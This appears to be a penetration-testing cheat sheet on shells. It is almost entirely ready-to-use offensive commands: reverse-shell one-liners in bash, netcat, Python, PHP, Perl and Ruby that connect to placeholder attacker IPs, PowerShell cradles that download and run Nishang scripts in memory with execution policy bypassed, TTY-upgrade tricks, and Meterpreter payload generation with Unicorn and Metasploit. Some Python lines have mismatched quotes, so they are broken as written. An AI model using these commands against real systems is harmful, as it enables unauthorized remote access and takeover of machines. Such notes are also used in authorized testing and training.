# General - Shells

### Detect firewalls

###### Outgoing traffic blocking

Listen to ICMP traffic on host:

```bash
tcpdump -i <interface> icmp
```

On target, make ICMP "echo" requests using ping in **background** to prevent
shell lose in case of blocked ping:

```bash
ping -c 4 <IP> &
```
```python
python -c 'import os;  os.popen("ping -c 4 <IP> &");"
```

If ICMP packets are received but TCP packets aren't then TCP may be blocked.

### Bind Shells

TODO

### Reverse Shells

###### Setup a listener on host
```
# TCP
nc -lvnp <PORT>

# UDP
nc -lvnpu <PORT>

# ICMP
python icmpsh_m.py <HOST_IP> <TARGET_IP>
```

###### Execute reverse shell command  

**Bash**
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

**Netcat**
```bash
# If nc e option:
nc -e /bin/sh <IP> <PORT> &
# Else:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

**Python**
```python
# TCP
python -c 'import os;  os.popen("nc -e /bin/sh <IP> <PORT> &");"
python -c 'import os;  os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f &");"
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
**Powershell**  
The Nishang powershell scripts can be used to get a reverse shell.  
The scripts needs to be hosted on a webserver, which can be done using
python:
```python
python -m SimpleHTTPServer <PORT>
```
The following commands will load directly in memory the powershell script hosted
on the remote webserver:
```powershell
# TCP
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>

# ICMP - Needs a ICMP listener
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress <IP>
```

**PHP**
```php
# This code assumes that the TCP connection uses file descriptor 3.
# If it doesn’t work, try 4, 5, 6…
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```
**Perl**
```perl
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Ruby**
```ruby
ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

###### Optional - Get TTY

```
/bin/sh -i
/bin/bash -i
echo os.system('/bin/bash')
-
# Python
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
-
# Perl
perl -e 'exec "/bin/sh";'
-
# From within IRB
exec "/bin/sh"
-
# From within vi
:!bash
:set shell=/bin/bash:shell
-
# With nmap
!sh
```

###### Optional - Get auto-completion and commands history
  - Set host terminal to raw with echo unset:
  `*ctrl-z* stty raw -echo`
  - If TERM environment variable is not set on target shell:
  `*ctrl+z* echo $TERM`
  `*fg* export TERM=<TERM>`

### Meterpreter

Meterpreter is an advanced, dynamically extensible payload that uses in-memory
DLL injection stagers and is extended over the network at runtime.  
It communicates over the stager socket and provides a comprehensive
client-side Ruby API.   
It features command history, tab completion, channels, and more.

###### Unicorn w/ PowerShell

Magic Unicorn is a tool for using a PowerShell downgrade attack and inject
shellcode (custom, cobalt or meterpreter) straight into memory.

*Ensure Metasploit is installed if using Metasploit methods.*

If using meterpreter payloads the script will generate two files :
 - powershell_attack.txt
 - unicorn.rc

The text file contains all of the code needed in order to inject the
powershell attack into memory and the rc file can be used to start a metesploit
reverse handler.

The commands are as follow:
```bash
python unicorn.py windows/meterpreter/reverse_http <HOST_IP> <HOST_PORT>

# On host
msfconsole -r unicorn.rc

# On target
# Execute the powershell command contained in the powershell_attack.txt file
```
